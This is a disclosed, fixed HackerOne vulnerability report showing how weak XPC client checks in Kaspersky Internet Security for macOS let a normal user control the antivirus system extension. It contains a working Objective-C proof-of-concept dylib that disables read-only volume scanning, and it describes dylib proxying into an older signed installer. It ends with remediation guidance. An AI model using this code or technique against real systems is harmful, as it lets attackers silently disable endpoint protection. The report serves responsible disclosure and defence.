# [Fixed] KIS for macOS is vulnerable to AV bypass due to improper client authorization on XPC service

## Report Details
- **Report ID**: 980876
- **URL**: https://hackerone.com/reports/980876
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-09-12T21:34:45.497Z
- **Disclosed**: 2021-04-01T12:18:34.134Z

## Reporter
- **Username**: theevilbit
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: kaspersky

## Vulnerability Information
> Note! Thank you for your report. For the purposes of the further analysis of the vulnerability, that you kindly report to us, could you please fill *all* fields [in square brackets]. This information will help us to respond you more quickly and triage your report. Thanks a lot for your assistance.

**Summary**
Kaspersky Internet Security uses endpoint security system extension (SEXT) from Big Sur. The system extension performs all of the AV functionality, like process monitoring, network monitoring, etc... the configuration of the SEXT is performed via XPC. Due to improper client verification on the XPC service a normal user can achieve full control of the extension and potentially disable all AV functionality.

**Description**
The Mach service name for the XPC connection can be found in the `Info.plist` file of the system extension.

```
<key>NEMachServiceName</key>
		███
```

Using this string we can initiate connection. The handler for the first contact is the `shouldAcceptNewConnection:` method of the `IPCService` class.

```objectivec
/* @class IPCService */
-(char)listener:(void *)arg2 shouldAcceptNewConnection:(void *)arg3 {
    rbx = self;
    r15 = [arg3 retain];
    var_48 = objc_opt_new(@class(NSString));
    rax = [r15 processIdentifier];
    r14 = rax;
    █████████

loc_100005a0a:
    if ([*(rbx + 0x10) isEqualToString:var_48] == 0x0) goto loc_100005b1b;

loc_100005a27:
    rax = [NSXPCInterface interfaceWithProtocol:@protocol(IPCServiceProtocol)]; 
```

The service only verifies if the Team ID is the one expected, but nothing else. Unfortunately this allows someone talk to the XPC service who can inject code into a custom Kaspersky process. The latest version of the AV is properly hardened against injection attacks, however that is not tru to older versions. What an attacker can do is downloading an old version of KIS and injecting code into that.

Downloading the `kavmac20.0.0.829aar_cs_da_de_en_es_es_fi_fr_it_nb_nl_pl_pt_pt_ru_sv_tr_21444.dmg` contains an installer that allows the injection of custom dylibs as library validation is disabled via the `com.apple.security.cs.disable-library-validation` entitlement.

```
Executable=/Volumes/Kaspersky Internet Security/Kaspersky Downloader.app/Contents/MacOS/Downloader
Identifier=com.kaspersky.kav.downloader
Format=app bundle with Mach-O thin (x86_64)
CodeDirectory v=20500 size=8072 flags=0x10000(runtime) hashes=243+5 location=embedded
Signature size=8985
Timestamp=2019. Oct 9. 13:20:29
Info.plist entries=18
TeamIdentifier=2Y8XE5CQ94
Runtime Version=10.14.0
Sealed Resources version=2 rules=13 files=155
Internal requirements count=1 size=188
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
	<true/>
	<key>com.apple.security.cs.disable-library-validation</key>
	<true/>
</dict>
</plist>
```

## Exploitation, POC
We will use a technique called dylib proxying. We will replace the `libkl_appkit.dylib` what we can find in the Installer's folder.

```
 % ls -l /Volumes/Kaspersky\ Internet\ Security/Kaspersky\ Downloader.app/Contents/MacOS 
total 3392
-rwxr-xr-x  1 csaby  staff  1015904 Oct  9  2019 Downloader
-rwxr-xr-x  1 csaby  staff   569152 Oct  9  2019 libkl_appkit.dylib
-rwxr-xr-x  1 csaby  staff   144256 Oct  9  2019 libz.1.2.11.dylib
```

Also we will prepare putting this installer in the `/Users/Shared` directory. Our POC needs to be prepared as follows.

```
████████
██████
█████████
█████
```

1. We compile our dylib with reexporting the original dylib, which we renamed to `libkl_appkit_orig.dylib`.
2. We correct the dylib path in the compiled dylib
3. We sign the dylib, either with a valid or adhoc signature. Here I used a valid.
4. Lastly we copy the dylib into its place

Then if we execute the installer our dylib will be loaded.

The POC looks as follows:

```objectivec
#import <Foundation/Foundation.h>

static NSString* kXPCHelperMachServiceName = @"2Y8XE5CQ94.com.kaspersky.kav.sysext";

@protocol IPCServiceProtocol <NSObject>
- (void)getEndpointForProtocol:(NSString *)arg1 withReply:(void (^)(NSError *, NSXPCListenerEndpoint *))arg2;
@end

@protocol FileMonitorProtocol
- (void)DisableReadonlyVolumeScan:(BOOL)arg1 reply:(void (^)(BOOL))arg2;
- (void)StartFileMonitor:(void (^)(BOOL))arg1;
@end

__attribute__((constructor))
static void customConstructor(int argc, const char **argv) {
        

        NSString*  _serviceName = kXPCHelperMachServiceName;

        NSXPCConnection* _agentConnection = [[NSXPCConnection alloc] initWithMachServiceName:_serviceName options:4096];
    
        [_agentConnection setRemoteObjectInterface:[NSXPCInterface interfaceWithProtocol:@protocol(IPCServiceProtocol)]];
    
        [_agentConnection resume];

        id agent = [_agentConnection remoteObjectProxyWithErrorHandler:^(NSError* error)
        {
            NSLog(@"[-] Something went wrong");
            NSLog(@"[-] Error: %@", error);
        }];

        //we first get the FileMonitorProtocol as an NSXPCListenerEndpoint
        [agent getEndpointForProtocol:@"FileMonitorProtocol" withReply:^(NSError * err, NSXPCListenerEndpoint * endpoint) {
            NSLog(@"Reply, %@", err);
            
            //once we get the NSXPCListenerEndpoint, we can create a new connection and use its methods
            NSXPCConnection* processConnection = [[NSXPCConnection alloc] initWithListenerEndpoint:endpoint];
            [processConnection setRemoteObjectInterface:[NSXPCInterface interfaceWithProtocol:@protocol(FileMonitorProtocol)]];
            [processConnection resume];
     
            id remoteObjectProxy = [processConnection remoteObjectProxy];
                 
            [remoteObjectProxy DisableReadonlyVolumeScan:1 reply:^(BOOL b){
                 NSLog(@"Reply, %hhd", b);
            }];
        }];

    
    NSLog(@"Done");
}
```

First we setup our connection, and we can only invoke one method, which is the `getEndpointForProtocol`. This is the function what we can use to get the XPC endpoint for the various functionalities. The connection is no longer verified at those protocols.

In the POC I ask for the `FileMonitorProtocol`, but I could do any other (e.g.: `ConnectionInterceptorProtocol`), there are plenty.

Once I get back the endpoint, I setup a new connection and invoke the `DisableReadonlyVolumeScan` method, which will disable the scan of read only volumes.

This will be reflected in the system logs upon execution:

```
FileMonitor: disabling read-only volume scan
```

It also reveals a bug in the UI, as the KIS UI is not updated reflecting the change, there is no "pull" of the current configuration from the system extension, so the UI and the SEXT will be out of sync.

## How to fix it properly?
1. The client process verification in the `shouldAcceptNewConnection` call should verify the the following:

a. The connecting process is signed by Apple
b. The connecting process is signed by your team ID
c. The connecting process is identified by your bundle ID
d. The connecting process has a minimum software version, where the fix has been implemented or it's hardened against injection  attacks.

For identifying the client at first place, the `audit_token` should be used instead of the PID, as the second is vulnerable to PID reuse attacks.

2. Beyond that the client which is allowed to connect has to be compiled with hardened runtime or library validation, without possessing the following entitlements:
```
com.apple.security.cs.allow-dyld-environment-variables
com.apple.security.cs.disable-library-validation
com.apple.security.get-task-allow
```

as these entitlements would allow another process to inject code into the app, and thus allowing it to talk to the SEXT.

**Environment**
- Scope: Application
- Product name: Kaspersky Internet Security
- Product version: 21.0.0.464
- OS name and version (incl SP): Big Sur Beta 6 (20A5364e)
- Attack type: Bypass/LPE
- Maximum user privileges needed to reproduce your issue: no privileges

**Steps to reproduce**
The old version of KIS installer with the compiled and injected dylib attached. Extract it in `/Users/Shared` and run. Monitoring the logs the message `FileMonitor: disabling read-only volume scan` will show up from the process `com.kaspersky.kav.sysext`.

Alternatively attached the source code for the poc, and prepare it (`/Users/Shared/Kaspersky Downloader.app` should be downloaded before):
```
████████
████████
██████
█████████
```

**Other info**
NA

## Impact

Full control of the AV as normal user

## Attachments
No attachments
